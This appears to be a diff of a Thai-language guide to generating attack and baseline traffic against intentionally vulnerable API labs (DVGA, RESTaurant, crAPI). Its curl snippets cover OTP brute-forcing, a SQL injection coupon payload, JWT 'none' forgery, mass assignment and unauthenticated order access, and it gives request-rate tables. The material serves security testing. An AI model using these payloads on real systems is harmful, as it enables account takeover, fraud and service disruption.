   RESULT=$(curl -sf -X POST ${CRAPI}/identity/api/auth/v2/check-otp \
     -H "Content-Type: application/json" \
@@ -473,7 +473,7 @@ for otp in $(seq -w 0000 9999); do
 done
 ```
 
-#### ความท้าทายที่ 4 — การเปิดเผยข้อมูล: รั่วไหลอีเมลช่าง
+#### ความท้าทายที่ 4 — การเปิดเผยข้อมูล: รั่วไหลอีเมลช่างซ่อม
 
 ```bash
 curl -sf ${CRAPI}/workshop/api/mechanic \
@@ -483,10 +483,10 @@ curl -sf ${CRAPI}/workshop/api/mechanic \
 #### ความท้าทายที่ 5 — การเปิดเผยข้อมูล: พารามิเตอร์การแปลงวิดีโอภายใน
 
 ```bash
-# อัปโหลดวิดีโอ จากนั้นตรวจสอบการตอบสนอง
+# อัปโหลดวิดีโอ แล้วตรวจสอบการตอบสนอง
 curl -sf ${CRAPI}/identity/api/v2/user/videos \
   -H "Authorization: Bearer ${TOKEN}" | python3 -m json.tool
-# มองหาฟิลด์ conversion_params ในการตอบสนอง
+# ดูฟิลด์ conversion_params ในการตอบสนอง
 ```
 
 #### ความท้าทายที่ 6 — DoS: Layer 7 ผ่าน Contact Mechanic
@@ -513,10 +513,10 @@ curl -X DELETE ${CRAPI}/identity/api/v2/admin/videos/VIDEO_ID_HERE \
   -H "Authorization: Bearer ${TOKEN}"
 ```
 
-#### ความท้าทายที่ 8 & 9 — Mass Assignment: รับสินค้าฟรีผ่านการจัดการคำสั่งซื้อ
+#### ความท้าทายที่ 8 & 9 — Mass Assignment: รับสินค้าฟรีผ่านการปรับแต่งคำสั่งซื้อ
 
 ```bash
-# เปลี่ยน GET เป็น PUT, แก้ไข status และ quantity
+# เปลี่ยน GET เป็น PUT แก้ไข status และ quantity
 curl -X PUT ${CRAPI}/workshop/api/shop/orders/1 \
   -H "Authorization: Bearer ${TOKEN}" \
   -H "Content-Type: application/json" \
@@ -566,10 +566,10 @@ curl -X POST ${CRAPI}/workshop/api/shop/apply_coupon \
   -d "{\"coupon_code\":\"TRAC075' OR '1'='1\"}"
 ```
 
-#### ความท้าทายที่ 14 — การเข้าถึงคำสั่งซื้อโดยไม่ต้องยืนยันตัวตน
+#### ความท้าทายที่ 14 — การเข้าถึงคำสั่งซื้อโดยไม่ยืนยันตัวตน
 
 ```bash
-# ไม่มี Authorization header — ยังคงส่งข้อมูลกลับมา
+# ไม่มี Authorization header — ยังคงส่งคืนข้อมูล
 for i in 1 2 3 4 5; do
   curl -sf ${CRAPI}/workshop/api/shop/orders/${i}
   echo ""
@@ -579,10 +579,10 @@ done
 #### ความท้าทายที่ 15 — JWT Algorithm Confusion
 
 ```bash
-# ปลอมแปลง JWT ด้วย algorithm "none" (ไม่ตรวจสอบลายเซ็น):
-# 1. ตั้ง header: {"alg":"none","typ":"JWT"} แล้วเข้ารหัส base64url
-# 2. ตั้ง payload: {"email":"admin@example.com","role":"admin"} แล้วเข้ารหัส base64url
-# 3. รวมด้วยจุด ปล่อยลายเซ็นว่าง: <header>.<payload>.
+# ปลอมแปลง JWT ด้วย algorithm "none" (ไม่มีการตรวจสอบลายเซ็น):
+# 1. ตั้ง header: {"alg":"none","typ":"JWT"} และ base64url-encode
+# 2. ตั้ง payload: {"email":"admin@example.com","role":"admin"} และ base64url-encode
+# 3. เชื่อมต่อด้วยจุด ปล่อย signature ว่าง: <header>.<payload>.
 HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
 PAYLOAD=$(echo -n '{"email":"admin@example.com","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
 FORGED="${HEADER}.${PAYLOAD}."
@@ -593,78 +593,78 @@ curl -sf ${CRAPI}/identity/api/v2/user/dashboard \
 
 ---
 
-## ตารางอ้างอิงข้าม OWASP API Security Top 10
+## การอ้างอิงข้ามกับ OWASP API Security Top 10
 
 | หมวดหมู่ OWASP | DVGA | RESTaurant | crAPI |
 |---|---|---|---|
-| **API1: BOLA** | — | `PUT /profile`, `GET /orders/{id}` | ตำแหน่งยานพาหนะ, รายงานช่าง, คำสั่งซื้อ |
-| **API2: การยืนยันตัวตนที่เสียหาย** | การปลอมแปลง JWT (คิวรี `me`) | JWT weak secret (97952) | Brute-force OTP (v2), JWT algorithm confusion |
-| **API3: BOPLA** | — | `PATCH /profile` (การยกระดับบทบาท) | Video conversion_params, การเปิดเผยอีเมลช่าง |
-| **API4: การใช้ทรัพยากร** | Batch, recursion, alias, field duplication DoS | การแจกแจงผู้ใช้ผ่านความยาวการตอบสนอง | `contact_mechanic` repeat_request DoS |
-| **API5: BFLA** | — | `DELETE /menu`, `PUT /users/update_role` | `DELETE /admin/videos` ในฐานะผู้ใช้ทั่วไป |
+| **API1: BOLA** | — | `PUT /profile`, `GET /orders/{id}` | ตำแหน่งยานพาหนะ, รายงานช่างซ่อม, คำสั่งซื้อ |
+| **API2: Broken Auth** | การปลอมแปลง JWT (query `me`) | JWT secret อ่อนแอ (97952) | OTP brute-force (v2), JWT algorithm confusion |
+| **API3: BOPLA** | — | `PATCH /profile` (การยกระดับบทบาท) | Video conversion_params, การเปิดเผยอีเมลช่างซ่อม |
+| **API4: Resource Consumption** | Batch, recursion, alias, field duplication DoS | การระบุผู้ใช้ผ่านความยาวการตอบสนอง | `contact_mechanic` repeat_request DoS |
+| **API5: BFLA** | — | `DELETE /menu`, `PUT /users/update_role` | `DELETE /admin/videos` โดยผู้ใช้ทั่วไป |
 | **API6: Mass Assignment** | — | `PUT /orders` (status, quantity) | สถานะ/จำนวนคำสั่งซื้อ, video conversion_params |
 | **API7: SSRF** | mutation `importPaste` | `PUT /menu` image_url | `contact_mechanic` mechanic_api URL |
-| **API8: การฉีด** | SQL (`filter`), XSS (`content`), OS cmd (`importPaste`, `systemDiagnostics`) | OS cmd (`/admin/stats/disk?parameters=`) | NoSQL (`validate-coupon`), SQL (`apply_coupon`) |
-| **API9: การจัดการทรัพยากรที่ไม่เหมาะสม** | — | — | `/auth/v2/check-otp` ที่เลิกใช้แล้ว (ไม่มี rate limit) |
-| **API10: การใช้งานที่ไม่ปลอดภัย** | — | — | (โดยอ้อมผ่าน SSRF) |
-| **เฉพาะ GraphQL** | Introspection, batching, recursion, aliases, field duplication, circular fragments | — | — |
+| **API8: Injection** | SQL (`filter`), XSS (`content`), OS cmd (`importPaste`, `systemDiagnostics`) | OS cmd (`/admin/stats/disk?parameters=`) | NoSQL (`validate-coupon`), SQL (`apply_coupon`) |
+| **API9: Improper Assets** | — | — | `/auth/v2/check-otp` ที่เลิกใช้แล้ว (ไม่มีการจำกัดอัตรา) |
+| **API10: Unsafe Consumption** | — | — | (ทางอ้อมผ่าน SSRF) |
+| **GraphQL-specific** | Introspection, batching, recursion, aliases, field duplication, circular fragments | — | — |
 
 ---
 
 ## รูปแบบการสร้างทราฟฟิก
 
-### เฟสที่ 1: พื้นฐาน (Happy Path)
+### ระยะที่ 1: Baseline (Happy Path)
 
-สร้างทราฟฟิกที่ถูกต้องเพื่อกำหนดพฤติกรรม API ปกติก่อนการทดสอบรูปแบบการโจมตี
+สร้างทราฟฟิกที่ถูกต้องตามกฎเพื่อกำหนดพฤติกรรม API ปกติก่อนทดสอบรูปแบบการโจมตี
 
-**พื้นฐาน DVGA:**
+**DVGA baseline:**
 ```bash
-# คิวรีปกติ
+# Query ปกติ
 curl -X POST ${ORIGIN}/dvga/graphql -H "Content-Type: application/json" -d '{"query":"{pastes{id title}}"}'
 curl -X POST ${ORIGIN}/dvga/graphql -H "Content-Type: application/json" -d '{"query":"mutation{createPaste(title:\"note\",content:\"hello\",public:true){paste{id}}}"}'
 ```
 
-**พื้นฐาน RESTaurant:**
+**RESTaurant baseline:**
 ```bash
 curl -sf ${ORIGIN}/restaurant/menu -H "Authorization: Bearer ${TOKEN}"
 curl -sf ${ORIGIN}/restaurant/profile -H "Authorization: Bearer ${TOKEN}"
 curl -X POST ${ORIGIN}/restaurant/orders -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" -d '{"menu_item_id":1,"quantity":1}'
 ```
 
-**พื้นฐาน crAPI:**
+**crAPI baseline:**
 ```bash
 curl -sf ${CRAPI}/identity/api/v2/user/dashboard -H "Authorization: Bearer ${TOKEN}"
 curl -sf ${CRAPI}/workshop/api/shop/products -H "Authorization: Bearer ${TOKEN}"
 curl -sf ${CRAPI}/community/api/v2/community/posts -H "Authorization: Bearer ${TOKEN}"
 ```
 
-### เฟสที่ 2: ทราฟฟิกโจมตีตามหมวดหมู่ OWASP
+### ระยะที่ 2: ทราฟฟิกการโจมตีตามหมวดหมู่ OWASP
 
-**การทดสอบ BOLA:** แจกแจง ID ต่อเนื่อง, สลับตัวระบุผู้ใช้ในคำขอ, เข้าถึงทรัพยากรโดยไม่มีสิทธิ์ความเป็นเจ้าของ
+**การทดสอบ BOLA:** ระบุ ID แบบลำดับ สลับ identifier ของผู้ใช้ในคำร้องขอ เข้าถึงทรัพยากรโดยไม่มีความเป็นเจ้าของ
 
-**การทดสอบการฉีด:** SQL payload ในพารามิเตอร์ filter/coupon, GraphQL query injection, OS command injection ผ่านฟิลด์พารามิเตอร์
+**การทดสอบ Injection:** SQL payload ในพารามิเตอร์ filter/coupon, GraphQL query injection, OS command injection ผ่านฟิลด์พารามิเตอร์
 
-**การทดสอบการข้ามการยืนยันตัวตน:** ปลอมแปลง JWT token, brute-force OTP, ใช้ API เวอร์ชันเก่า, algorithm confusion
+**การทดสอบการข้ามการยืนยันตัวตน:** ปลอมแปลง JWT token, brute-force OTP, ใช้เวอร์ชัน API ที่เลิกใช้แล้ว, algorithm confusion
 
-**การทดสอบ SSRF:** URL ภายในในพารามิเตอร์ `importPaste`, `image_url` และ `mechanic_api`
+**การทดสอบ SSRF:** URL ภายในใน `importPaste`, `image_url` และพารามิเตอร์ `mechanic_api`
 
-**การทดสอบ DoS:** การโจมตี GraphQL แบบ batch/recursion/alias, `repeat_request_if_failed` ด้วยจำนวนสูง
+**การทดสอบ DoS:** GraphQL batch/recursion/alias attacks, `repeat_request_if_failed` ที่มีจำนวนสูง
 
-### เฟสที่ 3: ห่วงโซ่การโจมตีแบบมีสถานะ
+### ระยะที่ 3: ห่วงโซ่การโจมตีแบบมีสถานะ
 
-การโจมตีบางอย่างต้องใช้ลำดับหลายขั้นตอนพร้อมสถานะ:
+การโจมตีบางรูปแบบต้องการลำดับขั้นตอนหลายขั้นที่มีสถานะ:
 
-1. **ห่วงโซ่การยกระดับ RESTaurant:** ลงทะเบียน → Token → PATCH บทบาทเป็น Chef → ยืนยันตัวตนอีกครั้ง → Command injection
-2. **ขั้นตอนเต็มของ crAPI:** ลงทะเบียน → ยืนยันอีเมล (MailHog) → เข้าสู่ระบบ → เพิ่มยานพาหนะ → ติดต่อช่าง (SSRF) → จัดการคำสั่งซื้อ
-3. **DVGA สำรวจสู่การโจมตี:** Introspection → ค้นพบ systemDiagnostics → Brute-force ข้อมูลรับรอง admin → เรียกใช้คำสั่ง OS
+1. **ห่วงโซ่การยกระดับ RESTaurant:** ลงทะเบียน → Token → PATCH role เป็น Chef → ยืนยันตัวตนใหม่ → Command injection
+2. **กระบวนการแบบสมบูรณ์ของ crAPI:** สมัครสมาชิก → ยืนยันอีเมล (MailHog) → เข้าสู่ระบบ → เพิ่มยานพาหนะ → Contact mechanic (SSRF) → การปรับแต่งคำสั่งซื้อ
+3. **DVGA recon-to-exploit:** Introspection → ค้นพบ systemDiagnostics → Brute-force ข้อมูลรับรอง admin → การรันคำสั่ง OS
 
 ### คำแนะนำอัตราการส่ง
 
-| รูปแบบ | คำขอ/วินาที | ระยะเวลา | หมายเหตุ |
+| รูปแบบ | คำร้องขอ/วินาที | ระยะเวลา | หมายเหตุ |
 |---|---|---|---|
-| พื้นฐาน (ต่อแอป) | 10-50 | 5 นาที | สร้างลายนิ้วมือทราฟฟิกปกติ |
-| การแจกแจง BOLA | 100-500 | 2 นาที | การสแกน ID ต่อเนื่อง |
-| Brute-force OTP | 1000+ | จนกว่าจะพบ | สูงสุด 10,000 ครั้ง (4 หลัก) |
-| GraphQL DoS | 10-50 | 30 วินาที | แต่ละคำขอใช้ทรัพยากรฝั่งเซิร์ฟเวอร์สูง |
-| การ fuzzing การฉีด | 50-200 | 5 นาที | เปลี่ยน payload ต่อคำขอ |
-| การสำรวจ SSRF | 5-20 | 2 นาที | ช้า; แต่ละครั้งทริกเกอร์ HTTP request ฝั่งเซิร์ฟเวอร์ |
+| Baseline (ต่อแอป) | 10-50 | 5 นาที | กำหนด fingerprint ทราฟฟิกปกติ |
+| BOLA enumeration | 100-500 | 2 นาที | การสแกน ID แบบลำดับ |
+| OTP brute-force | 1000+ | จนกว่าจะพบ | สูงสุด 10,000 ครั้ง (4 หลัก) |
+| GraphQL DoS | 10-50 | 30 วินาที | แต่ละคำร้องขอมีต้นทุนสูงฝั่งเซิร์ฟเวอร์ |
+| Injection fuzzing | 50-200 | 5 นาที | ปรับเปลี่ยน payload ในแต่ละคำร้องขอ |
+| SSRF probing | 5-20 | 2 นาที | ช้า; แต่ละครั้งทริกเกอร์ HTTP request ฝั่งเซิร์ฟเวอร์ |
